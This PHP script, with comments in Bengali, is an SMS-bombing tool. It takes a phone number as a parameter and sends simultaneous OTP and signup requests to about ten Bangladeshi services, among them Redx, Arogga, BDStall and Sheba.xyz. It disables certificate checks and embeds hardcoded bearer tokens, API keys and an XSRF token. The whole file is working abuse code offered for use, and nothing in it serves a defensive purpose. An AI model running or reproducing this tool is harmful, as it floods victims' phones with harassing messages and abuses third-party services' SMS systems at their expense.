<?php
header('Content-Type: application/json');

// ১. ফোন নম্বর গ্রহণ ও প্রাথমিক যাচাইকরণ
$phn = $_REQUEST["phone"] ?? $_GET["phone"] ?? null;

if (!$phn) {
    echo json_encode(["status" => "error", "message" => "Phone parameter is missing! Example: ?phone=01700000000"]);
    exit;
}

// ফরম্যাটিং
$phn_clean = ltrim($phn, '0'); // জিরো ছাড়া (যেমন: 1700000000)
$phn_full = "+88" . $phn;     // +88 সহ (যেমন: +8801700000000)

// ২. সকল API অপশন কনফিগার করা
$requests = [
    // API 1: Redx
    [
        'url' => 'https://api.redx.com.bd:443/v1/user/signup',
        'post' => json_encode(["name" => $phn, "service" => "redx", "phoneNumber" => $phn]),
        'headers' => ['Content-Type: application/json']
    ],
    // API 2: Arogga
    [
        'url' => 'https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10',
        'post' => "------WebKitFormBoundaryYpsCATbORcIEoBtS\r\nContent-Disposition: form-data; name=\"mobile\"\r\n\r\n" . $phn . "\r\n------WebKitFormBoundaryYpsCATbORcIEoBtS\r\nContent-Disposition: form-data; name=\"fcmToken\"\r\n\r\n\r\n------WebKitFormBoundaryYpsCATbORcIEoBtS\r\nContent-Disposition: form-data; name=\"referral\"\r\n\r\n\r\n------WebKitFormBoundaryYpsCATbORcIEoBtS--",
        'headers' => [
            "content-type: multipart/form-data; boundary=----WebKitFormBoundaryYpsCATbORcIEoBtS",
            "origin: https://www.arogga.com",
            "referer: https://www.arogga.com/",
            "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0 Safari/537.36"
        ]
    ],
    // API 3: Cinematic Mobi
    [
        'url' => 'https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/' . $phn,
        'post' => json_encode(['headers' => ['Content-Type' => 'application/json', 'Access-Control-Allow-Origin' => '*', 'Authorization' => 'Bearer 1pake4mh5ln64h5t26kpvm3iri']]),
        'headers' => [
            'Content-Type: application/json;charset=UTF-8',
            'Origin: https://cinematic.mobi',
            'Referer: https://cinematic.mobi/',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0 Safari/537.36'
        ]
    ],
    // API 4: BDStall
    [
        'url' => 'https://www.bdstall.com/userRegistration/save_otp_info/',
        'post' => http_build_query(['UserTypeID' => '2', 'RequestType' => '1', 'Name' => 'Md', 'Mobile' => $phn]),
        'headers' => ['Content-Type: application/x-www-form-urlencoded']
    ],
    // API 5: BCS Exam Aid
    [
        'url' => 'https://bcsexamaid.com/api/generateotp',
        'post' => json_encode(["mobile" => $phn, "softtoken" => "Rifat.Admin.2022"]),
        'headers' => ['Content-Type: application/json; charset=utf-8', 'User-Agent: Dart/3.1 (dart:io)']
    ],
    // API 6: Doctor Live BD
    [
        'url' => 'https://doctorlivebd.com/api/patient/auth/otpsend',
        'post' => http_build_query(['country_code' => '880', 'mobile' => $phn_clean]),
        'headers' => ['Content-Type: application/x-www-form-urlencoded', 'User-Agent: okhttp/4.10.0']
    ],
    // API 7: Apex4u
    [
        'url' => 'https://api.apex4u.com/api/auth/login',
        'post' => json_encode(["phoneNumber" => $phn]),
        'headers' => ['Content-Type: application/json', 'origin: https://apex4u.com', 'referer: https://apex4u.com/']
    ],
    // API 8: Sindabad
    [
        'url' => 'https://offers.sindabad.com/api/mobile-otp',
        'post' => json_encode(["key" => "c94e67fb2a59af3b6fa21f24463b2061", "mobile" => $phn_full]),
        'headers' => [
            'Content-Type: application/json',
            'Authorization: Bearer ODdweWQ2OTJwbDNiYjR6azMyazJpenBrdHQ2MjYybnZhc2luZGFiYWRjb21tb3ppbGxhNTAgd2luZG93cyBudCAxMDAgd2luNjQgeDY0IGFwcGxld2Via2l0NTM3MzYga2h0bWwgbGlrZSBnZWNrbyBjaHJvbWUxNDMwMDAgc2FmYXJpNTM3MzZiYW5lokOTRl63fbMmE1OWFmM2I2ZmEyMWYyNDQ2M2IyMDYx',
            'Origin: https://sindabad.com',
            'Referer: https://sindabad.com/'
        ]
    ],
    // API 9: KireiBD
    [
        'url' => 'https://app.kireibd.com/api/v2/send-login-otp',
        'post' => json_encode(["email" => $phn]),
        'headers' => [
            'Content-Type: application/json',
            'x-xsrf-token: eyJpdiI6Imh2dU9zVk9rQUR5TjlsQVBvd2F2cVE9PSIsInZhbHVlIjoiQlZUdXlHcmpES2FGUXBja1dZbUZXZG9MVksreEwxa1ZzZGgzYml3MHIxMmlraURSTjVLUnpPY0ZEeEJmSldqNGNaOG5rc0FNYkVDMlJqakJmZGVlckdvNVFobnBzTFpOSnpsbVZENlVvUW5JSHhvMkYxd1VKcG9Zc0tmTUlEdUQiLCJtYWMiOiJiZjIwNmQ0OWNlZTFiYWMyZWQ4YWRmMTEzYjAwNWFkOTNmOTgzMzRiODJlZWMxOWM0MTFhOGNkODhjNzQzZWQxIiwidGFnIjoiIn0='
        ]
    ]
];

// Sheba.xyz-এর জন্য টোকেন জেনারেট করে যুক্ত করা
$tokenCurl = curl_init('https://accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id=8329815A6D1AE6DD');
curl_setopt($tokenCurl, CURLOPT_RETURNTRANSFER, true);
$tokenResp = json_decode(curl_exec($tokenCurl), true);
curl_close($tokenCurl);

if (isset($tokenResp['token'])) {
    $requests[] = [
        'url' => 'https://accountkit.sheba.xyz/api/shoot-otp',
        'post' => json_encode(["mobile" => $phn_full, "app_id" => "8329815A6D1AE6DD", "api_token" => $tokenResp['token']]),
        'headers' => ['Content-Type: application/json']
    ];
}

// ৩. cURL Multi ব্যবহার করে সমান্তরালভাবে (Parallel) সব রিকোয়েস্ট পাঠানো
$mh = curl_multi_init();
$handles = [];

foreach ($requests as $i => $req) {
    $ch = curl_init($req['url']);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $req['post'],
        CURLOPT_HTTPHEADER => $req['headers'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 10,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    curl_multi_add_handle($mh, $ch);
    $handles[$i] = $ch;
}

// এক্সিকিউট করা
$running = null;
do {
    curl_multi_exec($mh, $running);
    curl_multi_select($mh);
} while ($running > 0);

// রেসপন্স সংগ্রহ করা
$results = [];
foreach ($handles as $i => $ch) {
    $results["api_" . ($i + 1)] = json_decode(curl_multi_getcontent($ch)) ?? curl_multi_getcontent($ch);
    curl_multi_remove_handle($mh, $ch);
    curl_close($ch);
}
curl_multi_close($mh);

// ফলাফল আউটপুট দেওয়া
echo json_encode([
    "status" => "success",
    "phone" => $phn,
    "total_api_called" => count($requests),
    "responses" => $results
], JSON_PRETTY_PRINT);
